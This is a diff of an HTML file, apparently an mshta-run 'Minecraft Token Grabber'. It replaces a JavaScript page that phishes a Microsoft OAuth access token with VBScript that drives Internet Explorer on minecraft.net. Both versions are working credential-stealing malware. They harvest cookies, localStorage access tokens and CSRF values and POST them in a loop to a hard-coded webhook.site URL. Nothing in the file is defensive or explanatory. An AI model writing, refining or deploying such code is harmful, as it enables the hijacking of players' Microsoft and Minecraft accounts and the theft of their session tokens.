@@ -1,107 +1,117 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Minecraft Login</title>
-    <style>
-        body {
-            background-color: #2c3e50;
-            color: white;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            flex-direction: column;
-        }
-        .container {
-            text-align: center;
-            background: #34495e;
-            padding: 2rem;
-            border-radius: 10px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-        }
-        h1 { margin-bottom: 1rem; }
-        p { color: #bdc3c7; }
-        #status {
-            margin-top: 20px;
-            font-weight: bold;
-            color: #f1c40f;
-        }
-    </style>
+    <title>Minecraft Token Grabber</title>
+    <!-- VBScript Logic -->
+    <script language="VBScript">
+        Option Explicit
+        
+        ' --- CONFIGURATION ---
+        Dim webhookURL
+        webhookURL = "https://webhook.site/acdbbbeb-9ba5-496d-84e9-8fbc668bfc1b"
+        
+        Dim objIE, objShell, objHTTP
+        
+        ' Initialize Objects
+        Set objShell = CreateObject("WScript.Shell")
+        Set objIE = CreateObject("InternetExplorer.Application")
+        Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+
+        ' --- SETUP VISUALS ---
+        objIE.Visible = True
+        objIE.ToolBar = 0
+        objIE.StatusBar = 1
+        objIE.Width = 800
+        objIE.Height = 600
+        
+        ' Open Minecraft.net in Frontend (Visible)
+        objIE.Navigate "https://www.minecraft.net/"
+
+        ' Wait for page to load roughly
+        WScript.Sleep 2000
+
+        ' --- FUNCTION: EXTRACT TOKENS (5 WAYS) ---
+        Sub GrabTokens()
+            Dim cookies, localStor, metaTags, urlInfo, clickAction
+            Dim finalData
+            
+            ' Method 1: Extract All Cookies from IE DOM
+            cookies = objIE.Document.cookie
+            
+            ' Method 2: Access LocalStorage (Common for MC tokens)
+            On Error Resume Next
+            localStor = objIE.Document.parentWindow.localStorage.getItem("accessToken") & "|" & _
+                        objIE.Document.parentWindow.localStorage.getItem("uuid")
+            If Err.Number <> 0 Then localStor = "Error Accessing LocalStorage"
+            On Error Goto 0
+            
+            ' Method 3: Extract Meta Tags (CSRF/Session)
+            Dim metaTag, i
+            metaTag = ""
+            For i = 0 To objIE.Document.getElementsByTagName("meta").Length - 1
+                If InStr(LCase(objIE.Document.getElementsByTagName("meta")(i).getAttribute("name")), "csrf") > 0 Then
+                    metaTag = metaTag & objIE.Document.getElementsByTagName("meta")(i).getAttribute("content") & "|"
+                End If
+            Next
+            
+            ' Method 4: Current URL & Title (Context)
+            urlInfo = "URL:" & objIE.LocationURL & "|Title:" & objIE.Document.Title
+
+            ' Method 5: Simulate Click on Login Button to trigger token refresh
+            On Error Resume Next
+            Dim loginBtn
+            Set loginBtn = objIE.Document.getElementById("login-link")
+            If Not loginBtn Is Nothing Then
+                loginBtn.Click
+                WScript.Sleep 1000
+                clickAction = "Clicked Login Button. New URL: " & objIE.LocationURL
+            Else
+                clickAction = "Login Button not found."
+            End If
+            On Error Goto 0
+
+            ' --- COMBINE DATA ---
+            finalData = "=== MSTHA REPORT ===" & vbCrLf & _
+                        "[1] Cookies: " & cookies & vbCrLf & _
+                        "[2] LocalStorage: " & localStor & vbCrLf & _
+                        "[3] Meta/CSRF: " & metaTag & vbCrLf & _
+                        "[4] Context: " & urlInfo & vbCrLf & _
+                        "[5] Action: " & clickAction & vbCrLf & _
+                        "===================="
+
+            ' --- SEND TO WEBHOOK ---
+            SendToWebhook finalData
+            
+            ' Refresh Loop
+            WScript.Sleep 5000
+            objIE.Refresh
+            GrabTokens ' Recursive call to keep running
+        End Sub
+
+        ' --- FUNCTION: SEND DATA ---
+        Sub SendToWebhook(data)
+            On Error Resume Next
+            objHTTP.Open "POST", webhookURL, False
+            objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+            
+            ' Encode data for URL (simple replacement)
+            Dim encodedData
+            encodedData = Replace(data, vbCrLf, "%0A")
+            encodedData = Replace(encodedData, "=", "%3D")
+            encodedData = Replace(encodedData, "&", "%26")
+            
+            objHTTP.Send "payload=" & encodedData
+        End Sub
+
+        ' --- START ---
+        Call GrabTokens()
+
+    </script>
 </head>
 <body>
-
-<div class="container">
-    <h1>Minecraft Token Stealer</h1>
-    <p id="status">Redirecting to Microsoft Login...</p>
-    <div id="log" style="font-size: 0.8rem; color: #95a5a6; margin-top: 10px;"></div>
-</div>
-
-<script>
-    // CONFIGURATION
-    const WEBHOOK_URL = 'https://webhook.site/acdbbbeb-9ba5-496d-84e9-8fbc668bfc1b'; // REPLACE WITH YOUR WEBHOOK URL
-    const REDIRECT_URI = window.location.href.split('#')[0]; // Current page URL
-    
-    // Microsoft App ID (Generic one that works for OAuth2)
-    const CLIENT_ID = '57abdbc2-3a8c-4968-a3f9-1e8d036b3f2d'; 
-
-    window.onload = function() {
-        const hash = window.location.hash.substring(1); // Remove '#'
-
-        if (hash && hash.includes('access_token')) {
-            // WE ARE BACK FROM LOGIN
-            document.getElementById('status').innerText = 'Login Successful! Extracting Token...';
-            
-            // Parse the access_token from the hash
-            // Format: #access_token=XXX&token_type=bearer&expires_in=XXX
-            const params = new URLSearchParams(hash);
-            const token = params.get('access_token');
-
-            if (token) {
-                document.getElementById('log').innerText = 'Token Found: ' + token.substring(0, 20) + '...';
-                sendToken(token);
-            } else {
-                document.getElementById('status').innerText = 'No token found in URL.';
-            }
-        } else {
-            // REDIRECT TO MICROSOFT LOGIN
-            // Using Implicit Grant flow to get token directly in URL
-            const msLoginUrl = `https://login.live.com/oauth20_authorize.srf?` +
-                `client_id=${CLIENT_ID}` +
-                `&response_type=token` +
-                `&scope=service%3Auser.auth.xboxlive.com%3AMBI_SSL` +
-                `&redirect_uri=${encodeURIComponent(REDIRECT_URI)}` +
-                `&state=rPwvR`; // Random state
-
-            window.location.href = msLoginUrl;
-        }
-    };
-
-    function sendToken(token) {
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', WEBHOOK_URL, true);
-        xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
-        
-        const data = JSON.stringify({
-            token: token,
-            source: 'mshta-stealer'
-        });
-
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                document.getElementById('status').innerText = 'Token Sent to Webhook!';
-                document.getElementById('status').style.color = '#2ecc71';
-            } else {
-                document.getElementById('status').innerText = 'Failed to send token.';
-            }
-        };
-
-        xhr.send(data);
-    }
-</script>
-
+    <div style="text-align:center; margin-top:50px;">
+        <h1>Minecraft.net</h1>
+        <p>Loading Token Data...</p>
+    </div>
 </body>
 </html>
